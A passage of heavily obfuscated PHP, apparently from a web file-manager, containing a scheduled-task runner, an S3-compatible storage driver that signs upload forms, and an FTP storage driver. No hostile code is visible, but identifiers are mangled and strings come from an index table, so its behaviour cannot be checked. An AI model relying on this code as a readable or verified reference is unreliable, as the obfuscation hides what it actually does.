$_SERVER[åÄ¼Ùßš]; http_close(); self::valueSet($¢æ³ ™Ç[843], $¢æ³ ™Ç[231]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($¢æ³ ™Ç[1766] => $¢æ³ ™Ç[231], $¢æ³ ™Ç[843] => $¢æ³ ™Ç[91])); self::log($¢æ³ ™Ç[1783]); } public static function taskSwitch() { $“îĞ–Ç =& $_SERVER[åÄ¼Ùßš]; $€ÄŞîˆ¾ = self::valueGet($“îĞ–Ç[843]) == $“îĞ–Ç[91] ? $“îĞ–Ç[231] : $“îĞ–Ç[91]; self::valueSet($“îĞ–Ç[843], $€ÄŞîˆ¾); } public static function shutdownEvent() { $µß„ğ’ç =& $_SERVER[åÄ¼Ùßš]; self::valueSet($µß„ğ’ç[1766], $µß„ğ’ç[231]); self::log($µß„ğ’ç[1784]); } public static function config($¯Œ†¾åÒ, $ÅôÕ¾­) { self::valueSet($_SERVER[åÄ¼Ùßš][843], $¯Œ†¾åÒ); } private static function taskRunAll() { $î‹  Š =& $_SERVER[åÄ¼Ùßš]; $ïäåÏÇÌ = timeFloat(); $’‰æĞ£ = Model($î‹  Š[1785])->listData(); $ÓâÄ§Õ = count($’‰æĞ£); for ($øğ½á¢ = 0; $øğ½á¢ < $ÓâÄ§Õ; $øğ½á¢++) { $Ë¸º»˜á = $’‰æĞ£[$øğ½á¢]; if (!$Ë¸º»˜á[$î‹  Š[484]] || $Ë¸º»˜á[$î‹  Š[1786]] != $î‹  Š[91]) { continue; } if (!self::taskTimeCheck($Ë¸º»˜á)) { continue; } self::taskRun($Ë¸º»˜á); } Hook::trigger($î‹  Š[1787]); self::taskQueueRun($ïäåÏÇÌ); } private static function taskQueueRun($ıÑëİÑƒ) { $µï²Ç•ô = 10; while (!0) { $¿¼°­…– = TaskQueue::run(); if ($¿¼°­…– === !1) { break; } if (timeFloat() - $ıÑëİÑƒ >= $µï²Ç•ô) { break; } } } private static function taskTimeCheck($Óé¹şÓ) { $®™‘æœƒ =& $_SERVER[åÄ¼Ùßš]; $÷ÏÓ®ÙÊ = json_decode($Óé¹şÓ[$®™‘æœƒ[207]], !0); $×‹ òó¬ = intval($Óé¹şÓ[$®™‘æœƒ[1767]]); $ßÑ’®±÷ = strtotime($®™‘æœƒ[1788] . $÷ÏÓ®ÙÊ[$®™‘æœƒ[1789]] . $®™‘æœƒ[1790]) - strtotime($®™‘æœƒ[1791]); $æË×á– = time() - strtotime(date($®™‘æœƒ[1792]) . $®™‘æœƒ[1793]); $€ç™Ş•Œ = $æË×á– >= $ßÑ’®±÷ && $æË×á– <= $ßÑ’®±÷ + 3600; switch ($÷ÏÓ®ÙÊ[$®™‘æœƒ[33]]) { case $®™‘æœƒ[1794]: if (time() - $×‹ òó¬ < 3600 * 24 * 30) { return !1; } if ($÷ÏÓ®ÙÊ[$®™‘æœƒ[1794]] == date($®™‘æœƒ[1795]) && $€ç™Ş•Œ) { return !0; } break; case $®™‘æœƒ[1796]: if (time() - $×‹ òó¬ < 3600 * 24 * 7) { return !1; } $îôûÖÀ„ = date($®™‘æœƒ[1797]) == 0 ? 7 : date($®™‘æœƒ[1797]); if ($÷ÏÓ®ÙÊ[$®™‘æœƒ[1796]] == $îôûÖÀ„ && $€ç™Ş•Œ) { return !0; } break; case $®™‘æœƒ[1789]: if (time() - $×‹ òó¬ < 3600 * 24) { return !1; } if ($€ç™Ş•Œ) { return !0; } break; case $®™‘æœƒ[1798]: if (time() - $×‹ òó¬ >= floatval($÷ÏÓ®ÙÊ[$®™‘æœƒ[1798]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Ø»­¹à¢ =& $_SERVER[åÄ¼Ùßš]; static $ÜôıîôÍ = 0; $ÜÚıŞš´ = 300; if (!$ÜôıîôÍ) { $ÜôıîôÍ = time(); } if (time() - $ÜôıîôÍ < $ÜÚıŞš´) { return; } $ÜôıîôÍ = time(); $¬˜‰•‹­ = Model($Ø»­¹à¢[590])->db($Ø»­¹à¢[12]); if ($¬˜‰•‹­) { $¬˜‰•‹­->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Ø»­¹à¢[1799], $Ø»­¹à¢[1800]); die; } } public static function taskRun($îê‰Ã”ù) { $é×ëĞâÂ =& $_SERVER[åÄ¼Ùßš]; self::log($é×ëĞâÂ[1801] . $îê‰Ã”ù[$é×ëĞâÂ[484]] . $é×ëĞâÂ[1802] . $îê‰Ã”ù[$é×ëĞâÂ[32]] . $é×ëĞâÂ[1803] . $îê‰Ã”ù[$é×ëĞâÂ[1804]]); Model($é×ëĞâÂ[1785])->run($îê‰Ã”ù[$é×ëĞâÂ[484]]); $ÀŒ…ŠÍ = timeFloat(); $ÀíÇ»©± = $é×ëĞâÂ[12]; switch ($îê‰Ã”ù[$é×ëĞâÂ[33]]) { case $é×ëĞâÂ[384]: $¯×öİ˜ = url_request($îê‰Ã”ù[$é×ëĞâÂ[1804]], $é×ëĞâÂ[1541], !1, !1, !1, !1, 10); if ($¯×öİ˜[$é×ëĞâÂ[843]]) { $ÀíÇ»©± = strlen($¯×öİ˜[$é×ëĞâÂ[1325]]); } break; case $é×ëĞâÂ[1805]: $ÀíÇ»©± = Hook::apply($îê‰Ã”ù[$é×ëĞâÂ[1804]]); default: break; } Model($é×ëĞâÂ[1806])->add(array($é×ëĞâÂ[1807] => $é×ëĞâÂ[12], $é×ëĞâÂ[1808] => $é×ëĞâÂ[231], $é×ëĞâÂ[33] => $é×ëĞâÂ[1809] . $îê‰Ã”ù[$é×ëĞâÂ[484]], $é×ëĞâÂ[1810] => json_encode(array($é×ëĞâÂ[32] => $îê‰Ã”ù[$é×ëĞâÂ[32]], $é×ëĞâÂ[1811] => timeFloat() - $ÀŒ…ŠÍ, $é×ëĞâÂ[849] => $ÀíÇ»©±)))); $†­‹ì‰’ = $ÀíÇ»©± ? $é×ëĞâÂ[1812] . $ÀíÇ»©± : $é×ëĞâÂ[12]; self::log($é×ëĞâÂ[1813] . $îê‰Ã”ù[$é×ëĞâÂ[484]] . $é×ëĞâÂ[178] . $†­‹ì‰’); return !0; } public static function valueGet($õº“‚·§) { $Ò˜‡Ï¸³ =& $_SERVER[åÄ¼Ùßš]; $â¬‚øê = $Ò˜‡Ï¸³[1814]; $ıïıô¨ = Model($Ò˜‡Ï¸³[519])->get($õº“‚·§, $â¬‚øê); if (is_null($ıïıô¨)) { Model($Ò˜‡Ï¸³[519])->set($Ò˜‡Ï¸³[843], $Ò˜‡Ï¸³[91], $â¬‚øê); Model($Ò˜‡Ï¸³[519])->set($Ò˜‡Ï¸³[1766], $Ò˜‡Ï¸³[231], $â¬‚øê); $ıïıô¨ = Model($Ò˜‡Ï¸³[519])->get($õº“‚·§, $â¬‚øê); } return $ıïıô¨; } private static function valueSet($äĞşŞÁœ, $ì…‡ÕŒš = false) { $úù‰Öµ =& $_SERVER[åÄ¼Ùßš]; $ƒŒ­¹ÃÊ = $úù‰Öµ[1815]; CacheLock::lock($ƒŒ­¹ÃÊ); $µÌâ®Ëò = Model($úù‰Öµ[519])->set($äĞşŞÁœ, $ì…‡ÕŒš, $úù‰Öµ[1814]); CacheLock::unlock($ƒŒ­¹ÃÊ); return $µÌâ®Ëò; } protected static function log($Ö™ÈºÃÂ) { write_log($Ö™ÈºÃÂ, $_SERVER[åÄ¼Ùßš][1800]); } private static function cacheClear() { $©ˆÌø¶¦ =& $_SERVER[åÄ¼Ùßš]; Cache::clearMemory(Model($©ˆÌø¶¦[519])->cacheKey($©ˆÌø¶¦[1814])); Cache::clearMemory(Model($©ˆÌø¶¦[519])->cacheKey($©ˆÌø¶¦[1816])); Model($©ˆÌø¶¦[1785])->cacheClear(); self::closeDatabase(); } } goto B³À›ç‚¯†; bŠğŸèàãè: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Ò®”åœœ) { parent::__construct($Ò®”åœœ); $this->setSignVersion($_SERVER[åÄ¼Ùßš][250]); } public function uploadFormData($Ôˆ·›‚ú, $÷Ù¿«— = 3600) { $ëÌ¸çÜ± =& $_SERVER[åÄ¼Ùßš]; $öË€²Ğ = $ëÌ¸çÜ±[232]; $Ä÷İ´ù = $ëÌ¸çÜ±[260]; $‘Á‰°Áí = $ëÌ¸çÜ±[62]; $”öƒúò = gmdate($ëÌ¸çÜ±[261]); $ìÍğôĞÄ = gmdate($ëÌ¸çÜ±[262]); $ï½¿ÍÌÆ = $ëÌ¸çÜ±[263]; $Œ¸É¨„ş = $÷Ù¿«— . $ëÌ¸çÜ±[12]; $€÷½Òô‚ = $ëÌ¸çÜ±[264]; $Åô²ñË£ = array($this->accessKey, $ìÍğôĞÄ, $this->region, $‘Á‰°Áí, $ï½¿ÍÌÆ); $Çğà¹ª³ = implode($ëÌ¸çÜ±[8], $Åô²ñË£); $´•·´â = array($ëÌ¸çÜ±[265] => gmdate($ëÌ¸çÜ±[1458], strtotime($ëÌ¸çÜ±[267])), $ëÌ¸çÜ±[268] => array(array($ëÌ¸çÜ±[269] => $this->bucket), array($ëÌ¸çÜ±[309] => $öË€²Ğ), array($ëÌ¸çÜ±[270], $ëÌ¸çÜ±[271], $ëÌ¸çÜ±[12]), array($ëÌ¸çÜ±[270], $ëÌ¸çÜ±[272], $ëÌ¸çÜ±[12]), array($ëÌ¸çÜ±[270], $ëÌ¸çÜ±[310], $ëÌ¸çÜ±[12]), array($ëÌ¸çÜ±[273] => $€÷½Òô‚), array($ëÌ¸çÜ±[274] => $Çğà¹ª³), array($ëÌ¸çÜ±[275] => $Ä÷İ´ù), array($ëÌ¸çÜ±[276] => $”öƒúò), array($ëÌ¸çÜ±[277] => $Œ¸É¨„ş))); $÷®º‰² = base64_encode(json_encode($´•·´â)); $Îœ£õ“í = hash_hmac($ëÌ¸çÜ±[278], $ìÍğôĞÄ, $ëÌ¸çÜ±[279] . $this->secret, !0); $­ŠÑ¨·Ğ = hash_hmac($ëÌ¸çÜ±[278], $this->region, $Îœ£õ“í, !0); $ÁÌ°Óš = hash_hmac($ëÌ¸çÜ±[278], $‘Á‰°Áí, $­ŠÑ¨·Ğ, !0); $’õ¥í«ş = hash_hmac($ëÌ¸çÜ±[278], $ï½¿ÍÌÆ, $ÁÌ°Óš, !0); $¼çÉì’® = hash_hmac($ëÌ¸çÜ±[278], $÷®º‰², $’õ¥í«ş); $øáµ¥€¿ = array($ëÌ¸çÜ±[249] => $ëÌ¸çÜ±[12], $ëÌ¸çÜ±[297] => $ëÌ¸çÜ±[12], $ëÌ¸çÜ±[309] => $öË€²Ğ, $ëÌ¸çÜ±[273] => $€÷½Òô‚, $ëÌ¸çÜ±[280] => $÷®º‰², $ëÌ¸çÜ±[311] => $Çğà¹ª³, $ëÌ¸çÜ±[312] => $Ä÷İ´ù, $ëÌ¸çÜ±[313] => $”öƒúò, $ëÌ¸çÜ±[314] => $Œ¸É¨„ş, $ëÌ¸çÜ±[315] => $¼çÉì’®, $ëÌ¸çÜ±[209] => $this->getHost()); return $øáµ¥€¿; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($€Ëê‹¨) { parent::__construct(); if (count($€Ëê‹¨) > 0) { $this->_init($€Ëê‹¨); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ğ¤„À¨”) { $öïìÌ…ß =& $_SERVER[åÄ¼Ùßš]; global $config; $this->appCharset = $config[$öïìÌ…ß[1484]]; $this->systemCharset = $config[$öïìÌ…ß[1485]]; if (isset($ğ¤„À¨”[$öïìÌ…ß[1486]]) && $ğ¤„À¨”[$öïìÌ…ß[1486]]) { $this->systemCharset = $ğ¤„À¨”[$öïìÌ…ß[1486]]; } } public function iconvApp($Ôúé®“·) { return $this->iconvTo($Ôúé®“·, $this->systemCharset, $this->appCharset); } public function iconvSystem($šÇ›Ã) { return $this->iconvTo($šÇ›Ã, $this->appCharset, $this->systemCharset); } public function getPathOuter($­×Õ‡ªã) { $†¸·–«‡ =& $_SERVER[åÄ¼Ùßš]; $…¨×úŞù = $this->iconvApp($this->pathBase); $­×Õ‡ªã = $this->iconvApp($­×Õ‡ªã); if (substr($…¨×úŞù, 0, 2) == $†¸·–«‡[1456]) { $…¨×úŞù = BASIC_PATH . substr($…¨×úŞù, 2); } if (substr($­×Õ‡ªã, 0, 2) == $†¸·–«‡[1456]) { $­×Õ‡ªã = BASIC_PATH . substr($­×Õ‡ªã, 2); } $…¨×úŞù = KodIO::clear($…¨×úŞù); $­×Õ‡ªã = KodIO::clear($­×Õ‡ªã); $­×Õ‡ªã = substr($­×Õ‡ªã, strlen($…¨×úŞù)); if (empty($this->pathDriver)) { return $­×Õ‡ªã; } return $this->pathDriver . $†¸·–«‡[8] . ltrim($­×Õ‡ªã, $†¸·–«‡[8]); } private function _init($Õ“¹ÔŸœ = array()) { $ƒÍÑÓß® =& $_SERVER[åÄ¼Ùßš]; if (!function_exists($ƒÍÑÓß®[1487])) { throw new Exception(LNG($ƒÍÑÓß®[1488])); } $this->config = $Õ“¹ÔŸœ; $this->charsetReset($Õ“¹ÔŸœ); foreach ($Õ“¹ÔŸœ as $²‹†üèÃ => $¤á”ÌêÍ) { if (isset($this->{$²‹†üèÃ})) { $this->{$²‹†üèÃ} = $¤á”ÌêÍ; } } return $this->_login($Õ“¹ÔŸœ); } private function _login($öËš‘—) { $úÆÕìÇÓ =& $_SERVER[åÄ¼Ùßš]; static $õ®Ò¸ËÃ = array(); $ßç§öÏ = md5(json_encode($öËš‘—)); if (isset($õ®Ò¸ËÃ[$ßç§öÏ])) { foreach ($õ®Ò¸ËÃ[$ßç§öÏ] as $Æ×ê­¾ç => $äëÈ­‡“) { $this->{$Æ×ê­¾ç} = $äëÈ­‡“; } return !0; } $ç‡°ìµÊ = parse_url(trim($this->server, $úÆÕìÇÓ[8])); $this->host = $ç‡°ìµÊ[$úÆÕìÇÓ[209]]; $Ç­¬àÕã = isset($ç‡°ìµÊ[$úÆÕìÇÓ[208]]) && $ç‡°ìµÊ[$úÆÕìÇÓ[208]] == $úÆÕìÇÓ[1489] ? !0 : !1; $this->scheme = $Ç­¬àÕã ? $úÆÕìÇÓ[1490] : $úÆÕìÇÓ[1491]; $this->port = isset($ç‡°ìµÊ[$úÆÕìÇÓ[210]]) ? $ç‡°ìµÊ[$úÆÕìÇÓ[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($úÆÕìÇÓ[1492]) . $this->host . $úÆÕìÇÓ[4] . $this->port, !0); return !1; } $â©®÷â = @ftp_login($this->connect, $this->username, $this->userpass); if (!$â©®÷â) { $this->writeLog(LNG($úÆÕìÇÓ[1493]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $úÆÕìÇÓ[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $œ®¥Õ™ø = $this->pasv == $úÆÕìÇÓ[91] ? !0 : !1; @ftp_pasv($this->connect, $œ®¥Õ™ø); $õ®Ò¸ËÃ[$ßç§öÏ] = array($úÆÕìÇÓ[1494] => $this->connect, $úÆÕìÇÓ[209] => $this->host, $úÆÕìÇÓ[208] => $this->scheme, $úÆÕìÇÓ[210] => $this->port); return $â©®÷â; } private function _isconn($Í‡¡•¤ = true) { if (is_resource($this->connect)) { return !0; } if (!$Í‡¡•¤) { return !1; } return $this->_login($this->config); } public function mkfile($â—¸£¢, $ªœÏûø = '', $ŠÈ³ºß© = REPEAT_RENAME) { if ($this->setContent($â—¸£¢, $ªœÏûø)) { return $this->getPathOuter($â—¸£¢); } $this->writeLog(LNG($_SERVER[åÄ¼Ùßš][1495]), !0); return !1; } public function mkdir($œ‘åÏÊ, $ æì¾ = REPEAT_SKIP) { $ú¸î¶© =& $_SERVER[åÄ¼Ùßš]; if (!$œ‘åÏÊ || $œ‘åÏÊ == $ú¸î¶©[8]) { return !0; } if (!$this->_isconn()) { return !1; } $œ‘åÏÊ = $this->iconvSystem($œ‘åÏÊ); if ($this->_isFolder($œ‘åÏÊ) || @ftp_mkdir($this->connect, $œ‘åÏÊ)) { return $this->getPathOuter($œ‘åÏÊ); } if (!$this->mkdir($this->pathFather($œ‘åÏÊ))) { return !1; } if ($œ‘åÏÊ = @ftp_mkdir($this->connect, $œ‘åÏÊ)) { return $this->getPathOuter($œ‘åÏÊ); } $×Å¶²Ñ = __FUNCTION__ . $ú¸î¶©[1496]; $this->writeLog($×Å¶²Ñ, !0); return !1; } public function copyFile($ó¿÷ˆÀ—, $²¸£µû‹) { if (!$this->_isconn()) { return !1; } $íê²š½ = $this->pathThis($this->iconvSystem($ó¿÷ˆÀ—)); $œ…éŸÕê = $this->tempFile($íê²š½); $ÃŠêúÒÂ = $this->iconvApp($œ…éŸÕê); $this->download($ó¿÷ˆÀ—, $ÃŠêúÒÂ); $˜ãî§ùš = $this->upload($²¸£µû‹, $ÃŠêúÒÂ); $this->tempFileRemve($œ…éŸÕê); return $˜ãî§ùš; } public function moveFile($ª‘·”Ö“, $ùºßÔ™‚) { if (!$this->_isconn()) { return !1; } $ª‘·”Ö“ = $this->iconvSystem($ª‘·”Ö“); $ùºßÔ™‚ = $this->iconvSystem($ùºßÔ™‚); $ÛÍ¸½á = @ftp_rename($this->connect, $ª‘·”Ö“, $ùºßÔ™‚); if (!$ÛÍ¸½á) { $this->writeLog(__FUNCTION__ . $_SERVER[åÄ¼Ùßš][1496], !0); return !1; } return $this->getPathOuter($ùºßÔ™‚); } public function delFile($„·¥»˜œ) { if (!$this->_isconn()) { return !1; } $„·¥»˜œ = $this->iconvSystem($„·¥»˜œ); $µÏÙ¹àİ = @ftp_delete($this->connect, $„·¥»˜œ); if (!$µÏÙ¹àİ) { $this->writeLog(__FUNCTION__ . $_SERVER[åÄ¼Ùßš][1496], !0); } return $µÏÙ¹àİ; } public function delFolder($½ÓŠÂ¿Š) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¨º¼ó‰¹ = $Ö÷¾’Ê² = array(); $this->fileList($½ÓŠÂ¿Š, $¨º¼ó‰¹, $Ö÷¾’Ê², !0); $this->listItemCache = !0; foreach ($Ö÷¾’Ê² as $Ü›ªÇ¬†) { $üÉ§îíï = $this->iconvSystem($Ü›ªÇ¬†[$_SERVER[åÄ¼Ùßš][32]]); $ØÊÉ¾ú± = @ftp_delete($this->connect, $üÉ§îíï); if (!$ØÊÉ¾ú±) { return !1; } } foreach ($¨º¼ó‰¹ as $üÉ§îíï) { $üÉ§îíï = $this->iconvSystem($üÉ§îíï); $ØÊÉ¾ú± = @ftp_rmdir($this->connect, $üÉ§îíï); if (!$ØÊÉ¾ú±) { return !1; } } $½ÓŠÂ¿Š = $this->iconvSystem($½ÓŠÂ¿Š); return @ftp_rmdir($this->connect, $½ÓŠÂ¿Š); } public function rename($¼¸Çı, $Î¤åİÜÂ) { $†¿ ç”´ =& $_SERVER[åÄ¼Ùßš]; if (!$this->_isconn()) { return !1; } $ÓàÛÖÚË = $this->fileNameAuto($this->pathFather($¼¸Çı), $Î¤åİÜÂ); $ÓàÛÖÚË = $this->iconvSystem($ÓàÛÖÚË); $¼¸Çı = $this->iconvSystem($¼¸Çı); $‘–èÔ½  = $this->pathFather($¼¸Çı); $óšœ¼£á = rtrim($‘–èÔ½ , $†¿ ç”´[8]) . $†¿ ç”´[8] . $ÓàÛÖÚË; $ƒÃ ßµı = @ftp_rename($this->connect, $¼¸Çı, $óšœ¼£á); if (!$ƒÃ ßµı) { $this->writeLog(__FUNCTION__ . $†¿ ç”´[1496], !0); return !1; } $óšœ¼£á = $this->iconvApp($óšœ¼£á); return $this->getPathOuter($óšœ¼£á); } private function folderInfo($ĞË—Ùí½, $²Ö³˜Í‹ = false) { $‘ìéÛåŞ =& $_SERVER[åÄ¼Ùßš]; $öÏÕÕ‡Æ = array($‘ìéÛåŞ[32] => $this->pathThis($ĞË—Ùí½), $‘ìéÛåŞ[87] => $this->getPathOuter($‘ìéÛåŞ[8] . $ĞË—Ùí½), $‘ìéÛåŞ[33] => $‘ìéÛåŞ[78]); if ($²Ö³˜Í‹) { return $öÏÕÕ‡Æ; } $öÏÕÕ‡Æ[$‘ìéÛåŞ[234]] = $öÏÕÕ‡Æ[$‘ìéÛåŞ[88]] = 0; $öÏÕÕ‡Æ[$‘ìéÛåŞ[235]] = $öÏÕÕ‡Æ[$‘ìéÛåŞ[236]] = !0; return $öÏÕÕ‡Æ; } private function fileInfo($™Íû¸Æö, $üæ„ÕÄå = false, $°ëûÅ«Å = array()) { $™¢—ÌÔ =& $_SERVER[åÄ¼Ùßš]; $øòö÷…‰ = array($™¢—ÌÔ[32] => $this->pathThis($™Íû¸Æö), $™¢—ÌÔ[87] => $this->getPathOuter($™¢—ÌÔ[8] . $™Íû¸Æö), $™¢—ÌÔ[33] => $™¢—ÌÔ[233], $™¢—ÌÔ[79] => isset($°ëûÅ«Å[$™¢—ÌÔ[79]]) ? $°ëûÅ«Å[$™¢—ÌÔ[79]] : 0, $™¢—ÌÔ[169] => $this->ext($™Íû¸Æö)); if ($üæ„ÕÄå) { return $øòö÷…‰; } $øòö÷…‰[$™¢—ÌÔ[234]] = $øòö÷…‰[$™¢—ÌÔ[88]] = 0; $øòö÷…‰[$™¢—ÌÔ[235]] = $øòö÷…‰[$™¢—ÌÔ[236]] = !0; $Ã”¹ïÓ = $this->iconvSystem($™Íû¸Æö); $øòö÷…‰[$™¢—ÌÔ[88]] = @ftp_mdtm($this->connect, $Ã”¹ïÓ); if (empty($°ëûÅ«Å)) { $°ëûÅ«Å = $this->objectMeta($™Íû¸Æö); if (!$°ëûÅ«Å) { return $øòö÷…‰; } } $øòö÷…‰[$™¢—ÌÔ[79]] = $°ëûÅ«Å[$™¢—ÌÔ[79]]; return $øòö÷…‰; } public function size($¿»Ú¯á) { $µİâ‚·ê = $this->objectMeta($¿»Ú¯á); return $µİâ‚·ê ? $µİâ‚·ê[$_SERVER[åÄ¼Ùßš][79]] : 0; } public function info($ÉÊ˜çÆ) { if ($this->isFile($ÉÊ˜çÆ)) { return $this->fileInfo($ÉÊ˜çÆ, 0); } else { if ($this->isFolder($ÉÊ˜çÆ)) { return $this->folderInfo($ÉÊ˜çÆ); } } return !1; } private function fileList($¦Î¦µô, &$ğğ·•, &$¦ÚÂÊç, $İ×ñØç = false) { $ÚŞ¥©¹ =& $_SERVER[åÄ¼Ùßš]; $¦Î¦µô = $this->iconvSystem($¦Î¦µô); if (!$this->isFolder($¦Î¦µô)) { return !1; } $¦Î¦µô = rtrim($¦Î¦µô, $ÚŞ¥©¹[8]) . $ÚŞ¥©¹[8]; check_abort(); $Õ„¬¨Úº = @ftp_rawlist($this->connect, $¦Î¦µô); if (!$Õ„¬¨Úº) { $Õ„¬¨Úº = array(); } $«ıÌ¾Ğ¿ = array($ÚŞ¥©¹[10] => 1, $ÚŞ¥©¹[1401] => 1); foreach ($Õ„¬¨Úº as $—“îî¤) { $ëœ¥ì¾§ = $this->_listItem($—“îî¤); if ($ëœ¥ì¾§[0] == $ÚŞ¥©¹[852]) { continue; } $Å¹íùÛ = $ëœ¥ì¾§[8]; if (empty($Å¹íùÛ) && $Å¹íùÛ !== $ÚŞ¥©¹[231] || isset($«ıÌ¾Ğ¿[$Å¹íùÛ])) { continue; } $Å¹íùÛ = $this->iconvApp($¦Î¦µô . ltrim($Å¹íùÛ, $ÚŞ¥©¹[8])); $©Š•î ¸ = array($ÚŞ¥©¹[32] => $Å¹íùÛ, $ÚŞ¥©¹[33] => $ÚŞ¥©¹[233], $ÚŞ¥©¹[79] => $ëœ¥ì¾§[4]); if (substr($—“îî¤, 0, 1) == $ÚŞ¥©¹[1497]) { $©Š•î ¸[$ÚŞ¥©¹[33]] = $ÚŞ¥©¹[78]; $©Š•î ¸[$ÚŞ¥©¹[79]] = 0; } $«Ã”±œ– = $©Š•î ¸[$ÚŞ¥©¹[33]] == $ÚŞ¥©¹[78] ? !0 : !1; $this->cacheMethodInfoSet($Å¹íùÛ, $«Ã”±œ–, $©Š•î ¸); if ($«Ã”±œ–) { $ğğ·•[] = $Å¹íùÛ; if ($İ×ñØç) { $this->fileList($Å¹íùÛ, $ğğ·•, $¦ÚÂÊç, $İ×ñØç); } continue; } $¦ÚÂÊç[] = $©Š•î ¸; } $this->cacheMethodInfoSet($¦Î¦µô, !0); } private function _listItem($µ„öíÅš) { if (empty($µ„öíÅš)) { return array(); } $ËıÈü„ò = preg_split($_SERVER[åÄ¼Ùßš][1498], $µ„öíÅš); if (count($ËıÈü„ò) <= 9) { return $ËıÈü„ò; } $ËıÈü„ò[8] = trim(substr($µ„öíÅš, strpos($µ„öíÅš, $ËıÈü„ò[7]) + strlen($ËıÈü„ò[7]))); return array_splice($ËıÈü„ò, 0, 9); } public function listPath($É¸´ì°«, $ú£¥àô¨ = false) { $‘­ÈÂÃ‡ =& $_SERVER[åÄ¼Ùßš]; if (!$this->_isconn()) { return !1; } $òİóä¬Ù = $ä¬¤Ë = array(); $this->fileList($É¸´ì°«, $òİóä¬Ù, $ä¬¤Ë); foreach ($òİóä¬Ù as $”øŸä¶’ => $ğ”€ÆØİ) { $òİóä¬Ù[$”øŸä¶’] = $this->folderInfo($ğ”€ÆØİ, $ú£¥àô¨); } foreach ($ä¬¤Ë as $”øŸä¶’ => $ğ”€ÆØİ) { $ä¬¤Ë[$”øŸä¶’] = $this->fileInfo($ğ”€ÆØİ[$‘­ÈÂÃ‡[32]], $ú£¥àô¨, $ğ”€ÆØİ); } return array($‘­ÈÂÃ‡[85] => $òİóä¬Ù, $‘­ÈÂÃ‡[86] => $ä¬¤Ë); } public function has($ Éô—»¡, $­ÌÄéø = false, $’á—Ü–ß = true) { $––Ä›š™ =& $_SERVER[åÄ¼Ùßš]; $îé°ç¼£ = $Ö¥ìÂ—ˆ = array(); $ƒ‚“è¤“ = $­ÌÄéø ? !0 : !1; $this->fileList($ Éô—»¡, $îé°ç¼£, $Ö¥ìÂ—ˆ, $ƒ‚“è¤“); if ($­ÌÄéø) { return array($––Ä›š™[242] => count($Ö¥ìÂ—ˆ), $––Ä›š™[243] => count($îé°ç¼£)); } if ($’á—Ü–ß) { if (count($Ö¥ìÂ—ˆ)) { return !0; } } else { if (count($îé°ç¼£)) { return !0; } } return !1; } public function listAll($äò´ÆÅ) { $ÍÉ›€ñ =& $_SERVER[åÄ¼Ùßš]; if (!$this->_isconn()) { return !1; } $ÕŒƒÅ–› = $ÉÆ´ü¯´ = array(); $this->fileList($äò´ÆÅ, $ÕŒƒÅ–›, $ÉÆ´ü¯´, !0); $öóÖÇçæ = array_to_keyvalue($ÉÆ´ü¯´, $ÍÉ›€ñ[32]); foreach ($ÕŒƒÅ–› as $„äì‚Ÿ) { if (is_string($„äì‚Ÿ)) { $öóÖÇçæ[$„äì‚Ÿ] = array($ÍÉ›€ñ[79] => 0); } } return $this->listAllFiles($äò´ÆÅ, $öóÖÇçæ); } public function getContent($›©ó´Ì±) { if (!$this->_isconn()) { return !1; } $›©ó´Ì± = $this->iconvSystem($›©ó´Ì±); return $this->fileSubstr($›©ó´Ì±); } public function setContent($‡ÑÀÙúº, $¼Æˆ·•Î = '') { if (!$this->_isconn()) { return !1; } $¹Ê‘ª—ö = $this->pathThis($this->iconvSystem($‡ÑÀÙúº)); $Ã”Œ¹Âç = $this->tempFile($¹Ê‘ª—ö); file_put_contents($Ã”Œ¹Âç, $¼Æˆ·•Î); $†Ë¨«Ö› = $this->upload($‡ÑÀÙúº, $this->iconvApp($Ã”Œ¹Âç)); $this->tempFileRemve($Ã”Œ¹Âç); return $†Ë¨«Ö›; } public function fileSubstr($« ƒõñ, $ˆ¬…ÇÑÎ = 0, $åöÜğÒ÷ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($« ƒõñ, $ˆ¬…ÇÑÎ, $åöÜğÒ÷); } private function ftpRequest($¥ş¹ŞèÛ, $Ìº‡ÒŞŠ = 0, $ÅÆ–é¥ = false) { $‹ò¹›Ö§ =& $_SERVER[åÄ¼Ùßš]; $¥ş¹ŞèÛ = $‹ò¹›Ö§[8] . ltrim(str_ltrim($¥ş¹ŞèÛ, $this->ftpPath), $‹ò¹›Ö§[8]); $¥ş¹ŞèÛ = $this->iconvSystem($¥ş¹ŞèÛ); $ÖÕµˆéÎ = $this->scheme . $this->host . $‹ò¹›Ö§[4] . $this->port; $¼ËóÔŞ÷ = curl_init(); curl_setopt($¼ËóÔŞ÷, CURLOPT_URL, $ÖÕµˆéÎ . $this->pathEncode($¥ş¹ŞèÛ)); curl_setopt($¼ËóÔŞ÷, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ÅÆ–é¥) { $Û²‚øÙ† = $Ìº‡ÒŞŠ + $ÅÆ–é¥ - 1; curl_setopt($¼ËóÔŞ÷, CURLOPT_RANGE, "{$Ìº‡ÒŞŠ}\55{$Û²‚øÙ†}"); } curl_setopt($¼ËóÔŞ÷, CURLOPT_RETURNTRANSFER, 1); $ƒ‹·•Îµ = curl_exec($¼ËóÔŞ÷); curl_close($¼ËóÔŞ÷); return $ƒ‹·•Îµ; } public function upload($ãµÔÇï, $“Œ¡İÜÔ, $‚Ø´¨ÜÕ = false, $Ù·Éùôâ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ãµÔÇï))) { return !1; } $ãµÔÇï = $this->iconvSystem($ãµÔÇï); $“Œ¡İÜÔ = $this->iconvSystem($“Œ¡İÜÔ); $¡¡Ğ›ì° = ftp_nb_put($this->connect, $ãµÔÇï, $“Œ¡İÜÔ, FTP_BINARY); while 